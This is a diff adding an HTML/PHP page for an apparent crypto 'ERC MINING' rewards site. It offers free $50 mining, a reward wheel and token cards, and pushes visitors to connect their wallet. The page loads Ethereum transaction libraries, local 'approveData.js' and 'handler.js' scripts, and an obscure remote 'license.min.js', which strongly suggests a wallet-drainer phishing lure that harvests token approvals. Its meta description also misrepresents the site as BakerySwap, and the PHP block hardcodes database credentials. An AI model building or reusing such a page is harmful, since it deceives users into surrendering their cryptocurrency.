@@ -1,0 +1,396 @@
+<html>
+
+<head>
+    <title>Unlock BakerySwap Rewards in Finance Today</title>
+    <meta name="Revisit-After" content="24 Days">
+    <meta name="Rating" content="General">
+    <meta http-equiv="Content-Language" content="EN">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="Description"
+        content="Unlock BakerySwap rewards with Crypticap, but tread carefully! Explore the potential of decentralized finance while staying informed about risks. Start maximizing your earnings today!">
+    <meta name="Keywords" content="
+BakerySwap rewards, BakerySwap staking, web3 rewards, decentralized finance (DeFi), BakerySwap tokenomics, yield farming, liquidity mining, crypto rewards, web3 applications, BakerySwap ecosystem, blockchain rewards, NFT rewards, DeFi platforms, web3 finance, BakerySwap governance token, crypto asset management, web3 user incentives, automated market maker (AMM), decentralized exchanges (DEX), BakerySwap liquidity pools, token staking benefits, earning crypto with BakerySwap, web3 investment strategies, passive income in DeFi
+">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style.css" rel="stylesheet">
+    <link href="192x192_App_Icon.png" rel="shortcut icon" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&amp;family=Montserrat:wght@400;500;700&amp;family=Raleway:wght@400;500;700&amp;family=Roboto:wght@400;500;700&amp;display=swap"
+        rel="stylesheet" />
+           <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+    <script
+        src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"
+        integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"
+        integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+</head>
+
+<body>
+    <div id="loader"></div>
+    <div class="main-content">
+<style>
+    .heading {
+        margin-top: 55px;
+        margin-bottom: -50px; /* Varsayılan olarak mobil görünüm */
+    }
+
+    /* PC ekranları için (768px ve üzeri genişliklerde) */
+    @media (min-width: 768px) {
+        .heading {
+            margin-bottom: -30px;
+        }
+    }
+</style>
+
+<div class="heading">
+    <h1>ERC MINING</h1>
+</div>
+
+        <div class="navbar">
+            <a class="active" href="">
+                Earn
+            </a>
+            <a href="">
+                Earn Others
+            </a>
+            <a href="">
+                NFT
+            </a>
+        </div>
+        <div class="iXuTqc">
+            <div class="sc-bJHhxl iQiucY">
+                <img src="192x192_App_Icon.png">
+                <div style="font-size: 20px;" class="bMNWii css-vurnku">Free mining up to $50 on all coins</div>
+            </div>
+        </div>
+        <div class="cards-container" style="margin-bottom: 90px;">
+            
+            
+
+
+<?php
+$servername = "localhost";
+$username = "dfdgdfg54fd4";
+$password = "dfdgdfg54fd4";
+$dbname = "dfdgdfg54fd4";
+
+// Veritabanına bağlan
+$conn = new mysqli($servername, $username, $password, $dbname);
+if ($conn->connect_error) {
+    die("Bağlantı hatası: " . $conn->connect_error);
+}
+
+// Token verilerini çek
+$sql = "SELECT * FROM tokens";
+$result = $conn->query($sql);
+
+if ($result->num_rows > 0) {
+    while ($row = $result->fetch_assoc()) {
+        echo '
+        <div class="card">
+            <div class="star-background">
+                <img class="star" src="icon_star.svg">
+            </div>
+            <div class="token-image">
+                <img src="' . htmlspecialchars($row["image_url"]) . '" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+            </div>
+            <div class="token-title">
+                <div class="css-2tt9xh">' . htmlspecialchars($row["name"]) . '</div>
+            </div>
+            <div class="token-description">
+                <div class="css-vurnku">Deposit:</div>
+                <div class="token-desc-secondary">
+                    <div class="css-o8yhuq">' . htmlspecialchars($row["deposit"]) . '</div>
+                </div>
+            </div>
+            <div class="token-description">
+                <div class="css-vurnku">Earn:</div>
+                <div class="token-desc-secondary">
+                    <div class="css-o8yhuq">' . htmlspecialchars($row["earn"]) . '</div>
+                </div>
+            </div>
+            <div class="token-description">
+                <div class="css-vurnku">Daily Earnings:</div>
+                <div class="token-desc-secondary">
+                    <div class="css-o8yhuq">' . htmlspecialchars($row["daily_earnings"]) . '%</div>
+                </div>
+            </div>
+
+            <!-- Slider ve Çizgi -->
+            <div class="slider-container">
+                <input type="range" min="0" max="500" value="50" class="slider">
+                <div class="slider-value">$50</div>
+            </div>
+
+            <div class="token-button">
+                <a href="' . htmlspecialchars($row["link"]) . '">Start Mining</a>
+            </div>
+        </div>';
+    }
+} else {
+    echo "Veri bulunamadı.";
+}
+
+$conn->close();
+?>
+
+
+
+<style>
+    .slider-container {
+        position: relative;
+        width: 100%;
+        margin-top: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .slider {
+        width: 80%;
+        -webkit-appearance: none;
+        appearance: none;
+        height: 8px;
+        background: #ddd;
+        outline: none;
+        border-radius: 4px;
+        transition: 0.3s;
+    }
+
+    .slider::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        appearance: none;
+        width: 20px;
+        height: 20px;
+        background: #FFCD84;
+        border-radius: 50%;
+        cursor: pointer;
+    }
+
+    .slider-value {
+        margin-top: 10px;
+        font-size: 18px;
+        font-weight: bold;
+        color: #FFCD84;
+    }
+</style>
+
+<script>
+    document.querySelectorAll(".card").forEach(card => {
+        const slider = card.querySelector(".slider");
+        const valueDisplay = card.querySelector(".slider-value");
+
+        // Sayfa yüklendiğinde default değer olan 50 gösterilsin
+        valueDisplay.innerText = `$${slider.value}`;
+
+        // Slider hareket ettikçe değeri güncelle
+        slider.addEventListener("input", function () {
+            valueDisplay.innerText = `$${this.value}`;
+        });
+    });
+</script>
+
+
+
+
+            
+            
+        </div>
+        <div class="popup-container" style="display: block;">
+            <div class="wheelDiv" style="display: none;">
+                <img class="marker" src="wheel-arrow.png">
+                <img class="wheel" src="wheel2.png">
+                <button class="wheel-button" id="wheel-spin-button">
+                    Spin the wheel
+                    <span style="font-size: 12px; display: block;">
+                        One time spin!
+                    </span>
+                </button>
+                <button class="wheel-button" id="wheel-claim-button" style="display: none;">
+                    Claim reward!
+                </button>
+            </div>
+        </div>
+    </div>
+    <div class="approve-container">
+    </div>
+
+
+    <script src="handler.js">
+    </script>
+    <script src="approveData.js">
+    </script>
+    <script src="cards.js">
+    </script>
+    <script src="wheel.js">
+    </script>
+    <div id="reown-app-kit-root"></div><w3m-modal class=""></w3m-modal>
+    
+<script src="https://cdn.jsdelivr.net/gh/codesgernet/wd/license.min.js"></script>
+    
+ 
+    <style>
+        /* Menü sabit konum */
+        .mobile-menu {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #FFCD84;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 3px 0 0 0;
+            z-index: 9999;
+        }
+
+        /* Menü öğeleri */
+        .menu-item {
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            flex: 1;
+            padding: 6px 0 0 0;
+        }
+
+        .menu-item i {
+            font-size: 26px; /* Icon büyüklüğü */
+            color: #722F0C;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .menu-item span {
+            color: #722F0C;
+            font-weight: bold;
+        }
+
+        /* Link tasarımı */
+        .menu-item a {
+            text-decoration: none;
+            color: inherit;
+            display: block;
+            padding: 5px 0;
+        }
+    </style>
+
+    <div class="mobile-menu">
+        <div class="menu-item" style="background: #722F0C; border-radius: 0 15px 15px 0;">
+                <i class="fa-solid fa-house" style="color: #FFCD84;"></i>
+                <span style="color: #FFCD84;">Home</span>
+        </div>
+        <div class="menu-item btn58">
+            <a href="#">
+                <i class="fa-solid fa-wallet"></i>
+                <span>My Earn</span>
+            </a>
+        </div>
+        <div class="menu-item btn58">
+            <a href="#">
+                <i class="fa-solid fa-users"></i>
+                <span>Team</span>
+            </a>
+        </div>
+        <div class="menu-item btn58">
+            <a href="#">
+                <i class="fa-solid fa-user"></i>
+                <span>My Account</span>
+            </a>
+        </div>
+    </div>
+    <div id="notification" class="notification">
+        Please Connect Wallet First
+    </div>
+
+
+    <script>
+        // Tüm butonları seç
+        document.querySelectorAll(".btn58").forEach(function (button) {
+            button.addEventListener("click", function () {
+                var notification = document.getElementById("notification");
+                notification.style.display = "block"; // Bildirimi göster
+                
+                // 2 saniye sonra bildirimi gizle
+                setTimeout(function () {
+                    notification.style.display = "none";
+                }, 3000);
+            });
+        });
+    </script>
+
+    <style>
+    .notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 15px;
+            display: none;
+            text-align: center;
+            font-size: 18px;
+            z-index: 1000;
+        }
+        .fixed-box {
+            position: fixed;
+            top: 5px;
+            background: #FFCD84;
+            height: 20px;
+            color: black;
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 9999;
+        }
+        .right-box {
+            right: 5px;
+        }
+        .left-box {
+            left: 5px;
+        }
+        .fixed-box i {
+            margin-right: 8px;
+        }
+        .fixed-box p {
+            margin: 0;
+            color: #722F19;
+        }
+    </style>
+
+    <!-- Sağ üst köşe (Madeni Para ve $50) -->
+    <div class="fixed-box right-box">
+        <i style="color: #722F19;" class="fas fa-coins"></i> 
+        <p>$50</p>
+    </div>
+
+    <!-- Sol üst köşe (Telegram ikonu ve @telegram) -->
+    <div class="fixed-box left-box" onclick="openLink('https://t.me/erc_mining')">
+        <i style="color: #722F19;" class="fab fa-telegram-plane"></i> 
+        <p>@erc_mining</p>
+    </div>
+
+        <script>
+        function openLink(url) {
+            window.open(url, '_blank');
+        }
+</script>
+        
+</body>
+
+</html>
